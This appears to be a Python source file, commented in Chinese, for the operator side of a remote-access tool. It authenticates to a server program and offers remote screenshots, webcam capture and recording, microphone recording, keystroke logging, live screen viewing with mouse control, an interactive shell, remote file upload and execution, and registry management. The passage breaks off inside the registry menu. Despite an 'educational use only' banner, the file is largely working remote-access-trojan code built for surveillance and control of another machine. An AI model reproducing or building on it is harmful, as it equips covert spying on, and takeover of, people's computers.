"""
客户端主程序 - 远程控制系统（控制器A）
实现客户端的所有功能
"""

import socket
import os
import sys
import getpass
import time
from datetime import datetime

# 导入自定义模块
from config import *
from protocol import *
from utils import *


class RemoteControlClient:
    """远程控制客户端类"""
    
    def __init__(self, server_ip, server_port=SERVER_PORT):
        """
        初始化客户端
        
        Args:
            server_ip: 服务器IP地址
            server_port: 服务器端口
        """
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_socket = None
        self.is_connected = False
        self.is_authenticated = False
    
    def _clear_socket_buffer(self, timeout=0.1):
        """
        清理socket接收缓冲区中的残留数据
        
        Args:
            timeout: 超时时间(秒)
        """
        original_timeout = self.client_socket.gettimeout()
        self.client_socket.settimeout(timeout)
        total_cleared = 0
        try:
            while True:
                leftover = self.client_socket.recv(4096)
                if not leftover:
                    break
                total_cleared += len(leftover)
        except:
            pass
        finally:
            self.client_socket.settimeout(original_timeout)
        return total_cleared
    
    def clear_buffer_manual(self):
        """手动清理缓冲区 - 用户可见的菜单选项"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  🧽 清理缓冲区{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.YELLOW}ℹ️  此功能用于清理视频流残留数据,修复 'UTF-8 解码错误'{Colors.RESET}")
            print(f"{Colors.YELLOW}ℹ️  如果视频预览/录像启动失败,请使用此功能{Colors.RESET}\n")
            
            input(f"{Colors.BOLD}按 Enter 键开始清理...{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}正在清理缓冲区...{Colors.RESET}")
            
            # 清理缓冲区,使用较长的超时确保清理干净
            cleared = self._clear_socket_buffer(timeout=1.0)
            
            if cleared > 0:
                print(f"{Colors.GREEN}✓ 成功清理 {cleared} 字节残留数据{Colors.RESET}")
                print(f"{Colors.GREEN}✓ 缓冲区已清空,现在可以正常使用视频功能{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}✓ 缓冲区已干净,没有发现残留数据{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}提示: 如果问题仍然存在,请尝试:{Colors.RESET}")
            print(f"  1. 重新连接客户端和服务端")
            print(f"  2. 确保所有视频预览窗口已关闭")
            print(f"  3. 再次运行此清理功能")
            
        except Exception as e:
            print(f"{Colors.RED}✗ 清理失败: {e}{Colors.RESET}")
        
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'  远程控制系统 - 客户端 (控制器A)':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  注意: 本程序仅用于教育学习目的{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  仅在本地网络或虚拟机环境中运行{Colors.RESET}")
        print(f"{Colors. CYAN}{'='*60}{Colors. RESET}\n")
    
    def connect(self):
        """连接到服务器"""
        try:
            print(f"{Colors.CYAN}正在连接到服务器 {self.server_ip}:{self.server_port}...{Colors.RESET}")
            
            # 创建套接字
            self.client_socket = socket.socket(socket. AF_INET, socket. SOCK_STREAM)
            self.client_socket.settimeout(CONNECTION_TIMEOUT)
            
            # 连接到服务器
            self.client_socket.connect((self.server_ip, self.server_port))
            self.is_connected = True
            
            print(f"{Colors. GREEN}✓ 连接成功! {Colors.RESET}\n")
            
            # 进行身份验证
            if self.authenticate():
                print(f"{Colors.GREEN}✓ 身份验证成功! {Colors.RESET}\n")
                self.is_authenticated = True
                return True
            else:
                print(f"{Colors.RED}✗ 身份验证失败!{Colors.RESET}")
                self.disconnect()
                return False
        
        except socket.timeout:
            print(f"{Colors.RED}✗ 连接超时{Colors.RESET}")
            return False
        except ConnectionRefusedError:
            print(f"{Colors.RED}✗ 连接被拒绝, 请确认服务器已启动{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}✗ 连接失败: {e}{Colors.RESET}")
            return False
    
    def authenticate(self):
        """
        身份验证
        
        Returns:
            bool: 验证是否成功
        """
        try:
            # 输入密码
            password = getpass. getpass(f"{Colors. BOLD}请输入密码: {Colors.RESET}")
            
            # 计算密码哈希
            password_hash = hash_password(password)
            
            # 发送验证请求
            auth_msg = create_auth_message(password_hash)
            send_message(self.client_socket, auth_msg)
            
            # 接收验证响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.AUTH_RESPONSE:
                return response['data']['success']
            
            return False
        
        except Exception as e:
            print(f"{Colors.RED}✗ 身份验证错误: {e}{Colors. RESET}")
            return False
    
    def disconnect(self):
        """断开连接"""
        if self.is_connected:
            try:
                # 发送断开连接消息
                disconnect_msg = create_disconnect_message()
                send_message(self.client_socket, disconnect_msg)
            except:
                pass
            
            self.client_socket.close()
            self.is_connected = False
            self.is_authenticated = False
            print(f"\n{Colors.GREEN}✓ 已断开连接{Colors. RESET}")
    
    def show_menu(self):
        """显示操作菜单"""
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'  操作菜单':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  1. {Colors.RESET} 📸 远程截屏")
        print(f"{Colors.BOLD}  2. {Colors.RESET} 📷 摄像头功能")
        print(f"{Colors.BOLD}  3. {Colors.RESET} 📂 文件管理")
        print(f"{Colors.BOLD}  4. {Colors.RESET} 🐚 交互式{SHELL_TYPE} (完整功能)")
        print(f"{Colors.BOLD}  5. {Colors.RESET} 🔐 注册表管理 (Windows)")
        print(f"{Colors.BOLD}  6. {Colors.RESET} 🎤 麦克风录音")
        print(f"{Colors.BOLD}  7. {Colors.RESET} 🖥️ 屏幕实时查看与鼠标控制")
        print(f"{Colors.BOLD}  8. {Colors.RESET} 🕵️ 键盘监控 (记录按键)")
        print(f"{Colors.BOLD}  9. {Colors.RESET} 💻 查看系统信息")
        print(f"{Colors.BOLD} 10. {Colors.RESET} 🚪 断开连接")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    
    def run(self):
        """运行客户端主循环"""
        # 连接到服务器
        if not self.connect():
            return
        
        # 主操作循环
        while self. is_authenticated:
            try:
                self.show_menu()
                choice = input(f"\n{Colors.BOLD}请选择操作 (1-10): {Colors.RESET}").strip()
                
                if choice == '1':
                    self.request_screenshot()
                elif choice == '2':
                    self.camera_menu()
                elif choice == '3':
                    self.file_management_menu()
                elif choice == '4':
                    self.enter_shell_mode()
                elif choice == '5':
                    self.registry_menu()
                elif choice == '6':
                    self.request_mic_record()
                elif choice == '7':
                    self.screen_preview()
                elif choice == '8':
                    self.keyboard_monitor()
                elif choice == '9':
                    self.request_system_info()
                elif choice == '10':
                    print(f"\n{Colors.YELLOW}正在断开连接...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}✗ 无效的选择, 请重新输入{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}操作被用户中断{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")
        
        # 断开连接
        self.disconnect()
    
    def request_screenshot(self):
        """请求远程截屏"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  远程截屏{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors. RESET}")
            
            # 发送截图请求
            msg = create_screenshot_message()
            send_message(self.client_socket, msg)
            
            print(f"{Colors. CYAN}正在请求截图...{Colors.RESET}")
            
            # 接收响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.SCREENSHOT_DATA:
                if response['data']['success']:
                    # 接收截图数据
                    img_data = receive_binary_data(self.client_socket)
                    
                    if img_data:
                        # 保存截图
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        filename = f"screenshot_{timestamp}.jpg"
                        filepath = os.path.join(SCREENSHOT_DIRECTORY, filename)
                        
                        if write_file_binary(filepath, img_data):
                            print(f"{Colors.GREEN}✓ 截图成功!{Colors. RESET}")
                            print(f"  文件大小: {format_file_size(len(img_data))}")
                            print(f"  保存位置: {filepath}")
                        else:
                            print(f"{Colors.RED}✗ 保存截图失败{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}✗ 接收截图数据失败{Colors. RESET}")
                else:
                    error = response['data']. get('error', '未知错误')
                    print(f"{Colors.RED}✗ 截图失败: {error}{Colors. RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 截图请求失败: {e}{Colors.RESET}")
    
    def show_camera_menu(self):
        """显示摄像头子菜单"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'  📷 摄像头功能菜单':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  1. {Colors.RESET} 📸 拍照")
        print(f"{Colors.BOLD}  2. {Colors.RESET} 📹 实时视频预览")
        print(f"{Colors.BOLD}  3. {Colors.RESET} 🎥 开始/停止录像")
        print(f"{Colors.BOLD}  9. {Colors.RESET} 🧽 清理缓冲区 (修复数据错乱)")
        print(f"{Colors.BOLD}  0. {Colors.RESET} ⬅️  返回主菜单")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    
    def camera_menu(self):
        """摄像头功能子菜单"""
        while True:
            try:
                self.show_camera_menu()
                choice = input(f"\n{Colors.BOLD}请选择功能 (0-3, 9): {Colors.RESET}").strip()
                
                if choice == '1':
                    self.request_camera()
                elif choice == '2':
                    self.video_preview()
                elif choice == '3':
                    self.video_record_menu()
                elif choice == '9':
                    self.clear_buffer_manual()
                elif choice == '0':
                    print(f"{Colors.CYAN}← 返回主菜单{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}✗ 无效的选择,请重新输入{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}← 返回主菜单{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")
    
    def request_camera(self):
        """请求摄像头拍照"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  摄像头拍照{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            # 发送摄像头请求
            msg = create_camera_message()
            send_message(self.client_socket, msg)
            
            print(f"{Colors.CYAN}正在启动摄像头...{Colors.RESET}")
            
            # 接收响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.CAMERA_DATA:
                if response['data']['success']:
                    # 接收摄像头数据
                    img_data = receive_binary_data(self.client_socket)
                    
                    if img_data:
                        # 保存到camera目录
                        filename = response['data'].get('filename', f"camera_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                        filepath = os.path.join(CAMERA_DIRECTORY, filename)
                        
                        if write_file_binary(filepath, img_data):
                            print(f"{Colors.GREEN}✓ 摄像头拍照成功!{Colors.RESET}")
                            print(f"  文件大小: {format_file_size(len(img_data))}")
                            print(f"  保存位置: {filepath}")
                        else:
                            print(f"{Colors.RED}✗ 保存照片失败{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}✗ 接收照片数据失败{Colors.RESET}")
                else:
                    error = response['data'].get('error', '未知错误')
                    print(f"{Colors.RED}✗ 摄像头拍照失败: {error}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 摄像头请求失败: {e}{Colors.RESET}")
    
    def video_preview(self):
        """实时视频预览"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  实时视频预览{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            # 获取视频参数
            print(f"\n{Colors.YELLOW}视频参数设置 (直接回车使用默认值):{Colors.RESET}")
            width = input(f"  宽度 [640]: ").strip() or "640"
            height = input(f"  高度 [480]: ").strip() or "480"
            fps = input(f"  帧率 [30]: ").strip() or "30"
            quality = input(f"  质量 1-100 [85]: ").strip() or "85"
            
            try:
                width = int(width)
                height = int(height)
                fps = int(fps)
                quality = int(quality)
            except:
                print(f"{Colors.RED}✗ 参数格式错误{Colors.RESET}")
                return
            
            # 清理socket缓冲区中可能残留的数据(防止上次未正常退出的残留)
            cleared = self._clear_socket_buffer()
            if cleared > 0:
                print(f"{Colors.YELLOW}ℹ️  已自动清理 {cleared} 字节残留数据{Colors.RESET}")
            
            # 发送开始视频流请求
            msg = create_video_start_message(width, height, fps, quality)
            send_message(self.client_socket, msg)
            
            print(f"\n{Colors.CYAN}正在启动视频流...{Colors.RESET}")
            print(f"{Colors.YELLOW}提示: 摄像头初始化可能需要30秒,请耐心等待{Colors.RESET}")
            
            # 临时延长超时时间,因为摄像头启动可能需要较长时间
            original_timeout = self.client_socket.gettimeout()
            self.client_socket.settimeout(VIDEO_START_TIMEOUT)
            
            try:
                # 接收响应
                response = receive_message(self.client_socket)
            finally:
                # 恢复原始超时
                self.client_socket.settimeout(original_timeout)
            
            if not response or response['type'] != MessageType.VIDEO_START:
                print(f"{Colors.RED}✗ 启动视频流失败{Colors.RESET}")
                return
            
            if not response['data']['success']:
                error = response['data'].get('error', '未知错误')
                print(f"{Colors.RED}✗ 启动视频流失败: {error}{Colors.RESET}")
                return
            
            print(f"{Colors.GREEN}✓ 视频流已启动{Colors.RESET}")
            print(f"{Colors.YELLOW}提示: 按 Ctrl+C 停止预览{Colors.RESET}\n")
            
            # 导入opencv显示视频
            try:
                import cv2
                import numpy as np
            except ImportError:
                print(f"{Colors.RED}✗ 未安装opencv-python,无法显示视频{Colors.RESET}")
                print(f"{Colors.YELLOW}正在接收视频帧但不显示...{Colors.RESET}")
                cv2 = None
            
            frame_count = 0
            start_time = time.time()
            
            error_count = 0
            max_errors = 5
            
            try:
                while True:
                    # 接收视频帧
                    frame_msg = receive_message(self.client_socket)
                    
                    if not frame_msg:
                        error_count += 1
                        if error_count >= max_errors:
                            print(f"{Colors.RED}✗ 连接断开{Colors.RESET}")
                            break
                        time.sleep(0.1)
                        continue
                    
                    # 检查消息类型
                    if frame_msg['type'] != MessageType.VIDEO_FRAME:
                        # 如果是ERROR或DISCONNECT消息,退出
                        if frame_msg['type'] in [MessageType.ERROR, MessageType.DISCONNECT]:
                            break
                        continue  # 其他消息,继续等待视频帧
                    
                    frame_data = receive_binary_data(self.client_socket)
                    
                    if not frame_data:
                        error_count += 1
                        if error_count >= max_errors:
                            print(f"{Colors.RED}✗ 接收失败{Colors.RESET}")
                            break
                        time.sleep(0.1)
                        continue
                    
                    frame_count += 1
                    error_count = 0  # 成功接收,重置错误计数
                    
                    # 显示视频帧
                    if cv2:
                        # 解码JPEG
                        nparr = np.frombuffer(frame_data, np.uint8)
                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                        
                        if frame is not None:
                            # 添加帧信息
                            elapsed = time.time() - start_time
                            actual_fps = frame_count / elapsed if elapsed > 0 else 0
                            cv2.putText(frame, f"FPS: {actual_fps:.1f}", (10, 30),
                                      cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
                            cv2.putText(frame, f"Frame: {frame_count}", (10, 70),
                                      cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
                            cv2.putText(frame, "Press 'q' to quit", (10, 110),
                                      cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
                            
                            cv2.imshow('Remote Camera', frame)
                            
                            # 检查退出
                            if cv2.waitKey(1) & 0xFF == ord('q'):
                                break
                    else:
                        # 不显示,只打印统计
                        if frame_count % 30 == 0:
                            elapsed = time.time() - start_time
                            actual_fps = frame_count / elapsed if elapsed > 0 else 0
                            print(f"  接收帧数: {frame_count}, FPS: {actual_fps:.1f}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}停止预览...{Colors.RESET}")
            
            finally:
                if cv2:
                    cv2.destroyAllWindows()
                
                # 发送停止视频流请求
                msg = create_video_stop_message()
                send_message(self.client_socket, msg)
                
                # 接收停止响应
                response = receive_message(self.client_socket)
                
                # 清空socket缓冲区中可能残留的视频帧数据
                self._clear_socket_buffer(timeout=0.5)
                
                elapsed = time.time() - start_time
                actual_fps = frame_count / elapsed if elapsed > 0 else 0
                print(f"\n{Colors.GREEN}✓ 视频流已停止{Colors.RESET}")
                print(f"  总帧数: {frame_count}")
                print(f"  总时长: {elapsed:.1f}秒")
                print(f"  平均FPS: {actual_fps:.1f}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 视频预览失败: {e}{Colors.RESET}")
            import traceback
            traceback.print_exc()

    def screen_preview(self):
        """实时屏幕预览并支持鼠标控制"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  屏幕实时查看与鼠标控制{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

            print(f"\n{Colors.YELLOW}屏幕参数 (直接回车使用默认):{Colors.RESET}")
            fps = input(f"  帧率 [10]: ").strip() or '10'
            quality = input(f"  JPEG质量 1-100 [70]: ").strip() or '70'
            try:
                fps = int(fps)
                quality = int(quality)
            except:
                print(f"{Colors.RED}✗ 参数格式错误, 使用默认值{Colors.RESET}")
                fps = 10
                quality = 70

            # 清理缓冲区
            cleared = self._clear_socket_buffer()
            if cleared > 0:
                print(f"{Colors.YELLOW}ℹ️  已自动清理 {cleared} 字节残留数据{Colors.RESET}")

            # 请求服务器开始屏幕流
            msg = create_screen_start_message(region=None, fps=fps, quality=quality)
            send_message(self.client_socket, msg)

            # 接收开始响应
            response = receive_message(self.client_socket)
            if not response or response['type'] != MessageType.SCREEN_START or not response['data'].get('success'):
                print(f"{Colors.RED}✗ 启动屏幕查看失败: {response['data'].get('error','未知错误') if response else '无响应'}{Colors.RESET}")
                return

            print(f"{Colors.GREEN}✓ 屏幕流已启动, 按 'q' 退出预览{Colors.RESET}")

            # 导入opencv
            try:
                import cv2
                import numpy as np
            except ImportError:
                print(f"{Colors.RED}✗ 未安装 opencv-python, 无法显示屏幕预览{Colors.RESET}")
                return

            window_name = 'Remote Screen'
            cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)

            # 鼠标回调: 发送鼠标事件到服务器
            def _mouse_cb(event, x, y, flags, param):
                try:
                    if event == cv2.EVENT_LBUTTONDOWN:
                        msg = create_mouse_event_message('click', x=x, y=y, button='left', clicks=1)
                        send_message(self.client_socket, msg)
                    elif event == cv2.EVENT_RBUTTONDOWN:
                        msg = create_mouse_event_message('click', x=x, y=y, button='right', clicks=1)
                        send_message(self.client_socket, msg)
                    elif event == cv2.EVENT_MOUSEMOVE and (flags & cv2.EVENT_FLAG_LBUTTON):
                        # drag with left button pressed
                        msg = create_mouse_event_message('move', x=x, y=y)
                        send_message(self.client_socket, msg)
                except Exception:
                    pass

            cv2.setMouseCallback(window_name, _mouse_cb)

            frame_count = 0
            start_time = time.time()

            try:
                while True:
                    frame_msg = receive_message(self.client_socket)
                    if not frame_msg:
                        time.sleep(0.05)
                        continue

                    if frame_msg['type'] == MessageType.SCREEN_FRAME:
                        frame_data = receive_binary_data(self.client_socket)
                        if not frame_data:
                            continue
                        # 显示JPEG数据
                        nparr = np.frombuffer(frame_data, np.uint8)
                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                        if frame is None:
                            continue
                        frame_count += 1
                        # 显示
                        cv2.imshow(window_name, frame)
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            break
                    elif frame_msg['type'] == MessageType.SCREEN_STOP:
                        break
                    else:
                        # 忽略其他消息
                        continue

            except KeyboardInterrupt:
                pass
            finally:
                try:
                    msg = create_screen_stop_message()
                    send_message(self.client_socket, msg)
                except:
                    pass
                cv2.destroyAllWindows()
                elapsed = time.time() - start_time
                actual_fps = frame_count / elapsed if elapsed > 0 else 0
                print(f"\n{Colors.GREEN}✓ 屏幕预览已停止{Colors.RESET}")
                print(f"  总帧数: {frame_count}")
                print(f"  总时长: {elapsed:.1f}秒")
                print(f"  平均FPS: {actual_fps:.1f}")

        except Exception as e:
            print(f"{Colors.RED}✗ 屏幕预览失败: {e}{Colors.RESET}")
    
    def video_record_menu(self):
        """录像管理菜单"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  录像管理{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.YELLOW}ℹ️  提示: 视频流将自动启动/关闭{Colors.RESET}")
            print(f"{Colors.BOLD}  1. {Colors.RESET} 🔴 开始录像 (自动启动视频流)")
            print(f"{Colors.BOLD}  2. {Colors.RESET} ⏹️  停止录像 (自动关闭视频流)")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            choice = input(f"\n{Colors.BOLD}请选择 (1-2): {Colors.RESET}").strip()
            
            if choice == '1':
                # 开始录像
                filename = input(f"{Colors.BOLD}录像文件名 (留空自动生成): {Colors.RESET}").strip() or None
                
                # 清理socket缓冲区中可能残留的数据
                self._clear_socket_buffer()
                
                msg = create_record_start_message(filename)
                send_message(self.client_socket, msg)
                
                print(f"{Colors.CYAN}正在开始录像...{Colors.RESET}")
                print(f"{Colors.YELLOW}提示: 如果视频流未启动,需要初始化摄像头,可能需要30秒{Colors.RESET}")
                
                # 临时延长超时时间
                original_timeout = self.client_socket.gettimeout()
                self.client_socket.settimeout(VIDEO_START_TIMEOUT)
                
                try:
                    response = receive_message(self.client_socket)
                finally:
                    self.client_socket.settimeout(original_timeout)
                
                if response and response['type'] == MessageType.RECORD_STATUS:
                    if response['data']['success']:
                        filepath = response['data'].get('filepath', '')
                        auto_started = response['data'].get('auto_started', False)
                        print(f"{Colors.GREEN}✓ 录像已开始{Colors.RESET}")
                        if auto_started:
                            print(f"  {Colors.CYAN}ℹ️  视频流已自动启动{Colors.RESET}")
                        print(f"  保存位置: {filepath}")
                    else:
                        error = response['data'].get('error', '未知错误')
                        print(f"{Colors.RED}✗ 开始录像失败: {error}{Colors.RESET}")
            
            elif choice == '2':
                # 停止录像
                msg = create_record_stop_message()
                send_message(self.client_socket, msg)
                
                print(f"{Colors.CYAN}正在停止录像...{Colors.RESET}")
                
                response = receive_message(self.client_socket)
                
                if response and response['type'] == MessageType.RECORD_STATUS:
                    if response['data']['success']:
                        message = response['data'].get('message', '')
                        auto_stopped = response['data'].get('auto_stopped', False)
                        print(f"{Colors.GREEN}✓ {message}{Colors.RESET}")
                        if auto_stopped:
                            print(f"  {Colors.CYAN}ℹ️  视频流已自动关闭{Colors.RESET}")
                    else:
                        error = response['data'].get('error', '未知错误')
                        print(f"{Colors.RED}✗ 停止录像失败: {error}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 录像操作失败: {e}{Colors.RESET}")
    
    def show_file_management_menu(self):
        """显示文件管理菜单"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}  📂 文件管理{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  1. {Colors.RESET} 📥 下载文件")
        print(f"{Colors.BOLD}  2. {Colors.RESET} 📤 上传文件")
        print(f"{Colors.BOLD}  3. {Colors.RESET} ▶️ 执行文件")
        print(f"{Colors.BOLD}  0. {Colors.RESET} 🔙 返回主菜单")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    
    def file_management_menu(self):
        """文件管理菜单"""
        while True:
            try:
                self.show_file_management_menu()
                choice = input(f"\n{Colors.BOLD}请选择操作 (0-3): {Colors.RESET}").strip()
                
                if choice == '1':
                    self.request_file_download()
                elif choice == '2':
                    self.request_file_upload()
                elif choice == '3':
                    self.request_file_execute()
                elif choice == '0':
                    break
                else:
                    print(f"{Colors.RED}✗ 无效的选择, 请重新输入{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}操作被用户中断{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")
    
    def request_file_download(self):
        """请求文件下载"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  文件下载{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            filepath = input(f"{Colors. BOLD}请输入要下载的文件路径: {Colors.RESET}").strip()
            
            if not filepath:
                print(f"{Colors.RED}✗ 文件路径不能为空{Colors.RESET}")
                return
            
            # 发送文件下载请求
            msg = create_file_download_message(filepath)
            send_message(self.client_socket, msg)
            
            print(f"{Colors.CYAN}正在下载文件...{Colors. RESET}")
            
            # 接收响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.FILE_DATA:
                if response['data']['success']:
                    # 接收文件数据
                    file_data = receive_binary_data(self.client_socket)
                    
                    if file_data:
                        # 保存文件到Download目录
                        filename = response['data']['filename']
                        save_path = os.path.join(DOWNLOAD_DIRECTORY, filename)
                        
                        if write_file_binary(save_path, file_data):
                            print(f"{Colors.GREEN}✓ 文件下载成功!{Colors.RESET}")
                            print(f"  文件名: {filename}")
                            print(f"  文件大小: {format_file_size(len(file_data))}")
                            print(f"  保存位置: {save_path}")
                        else:
                            print(f"{Colors.RED}✗ 保存文件失败{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}✗ 接收文件数据失败{Colors.RESET}")
                else:
                    error = response['data'].get('error', '未知错误')
                    print(f"{Colors.RED}✗ 文件下载失败: {error}{Colors. RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 文件下载请求失败: {e}{Colors.RESET}")
    
    def request_file_upload(self):
        """请求文件上传"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  文件上传{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            # 输入本地文件路径
            local_filepath = input(f"{Colors.BOLD}请输入本地文件路径: {Colors.RESET}").strip()
            
            if not local_filepath:
                print(f"{Colors.RED}✗ 文件路径不能为空{Colors.RESET}")
                return
            
            # 检查文件是否存在
            if not os.path.exists(local_filepath):
                print(f"{Colors.RED}✗ 文件不存在: {local_filepath}{Colors.RESET}")
                return
            
            if not os.path.isfile(local_filepath):
                print(f"{Colors.RED}✗ 不是一个文件: {local_filepath}{Colors.RESET}")
                return
            
            # 输入远程保存路径
            remote_filepath = input(f"{Colors.BOLD}请输入远程保存路径 (留空则保存到safe_files/目录): {Colors.RESET}").strip()
            
            if not remote_filepath:
                remote_filepath = os.path.basename(local_filepath)
            
            # 读取文件数据
            file_data = read_file_binary(local_filepath)
            if file_data is None:
                print(f"{Colors.RED}✗ 读取本地文件失败{Colors.RESET}")
                return
            
            # 发送文件上传请求
            filename = os.path.basename(local_filepath)
            msg = create_file_upload_message(remote_filepath, filename)
            send_message(self.client_socket, msg)
            
            # 发送文件数据
            print(f"{Colors.CYAN}正在上传文件... ({format_file_size(len(file_data))}){Colors.RESET}")
            send_binary_data(self.client_socket, file_data)
            
            # 接收响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.FILE_UPLOAD_RESPONSE:
                if response['data']['success']:
                    print(f"{Colors.GREEN}✓ 文件上传成功!{Colors.RESET}")
                    print(f"  本地文件: {local_filepath}")
                    print(f"  远程路径: {response['data']['filepath']}")
                    print(f"  文件大小: {format_file_size(len(file_data))}")
                else:
                    error = response['data'].get('error', '未知错误')
                    print(f"{Colors.RED}✗ 文件上传失败: {error}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 文件上传请求失败: {e}{Colors.RESET}")
    
    def request_file_execute(self):
        """请求文件执行"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  文件执行{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.RED}⚠️  注意: 文件执行限制在safe_files/目录内{Colors.RESET}")
            
            filepath = input(f"{Colors.BOLD}请输入要执行的文件路径: {Colors.RESET}").strip()
            
            if not filepath:
                print(f"{Colors.RED}✗ 文件路径不能为空{Colors.RESET}")
                return
            
            # 输入执行参数
            args = input(f"{Colors.BOLD}请输入执行参数 (可选): {Colors.RESET}").strip()
            
            # 发送文件执行请求
            msg = create_file_execute_message(filepath, args)
            send_message(self.client_socket, msg)
            
            print(f"{Colors.CYAN}正在执行文件...{Colors.RESET}")
            
            # 接收响应
            response = receive_message(self.client_socket)
            
            if response and response['type'] == MessageType.FILE_EXECUTE_RESPONSE:
                if response['data']['success']:
                    print(f"{Colors.GREEN}✓ 文件执行成功!{Colors.RESET}")
                    print(f"  文件路径: {filepath}")
                    print(f"  执行参数: {args if args else '(无)'}")
                    print(f"  进程ID: {response['data']['pid']}")
                    
                    # 显示输出
                    if 'output' in response['data'] and response['data']['output']:
                        print(f"\n{Colors.CYAN}输出:{Colors.RESET}")
                        print(response['data']['output'])
                else:
                    error = response['data'].get('error', '未知错误')
                    print(f"{Colors.RED}✗ 文件执行失败: {error}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 文件执行请求失败: {e}{Colors.RESET}")

    def show_registry_menu(self):
        """显示注册表管理菜单 (仅 Windows)"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
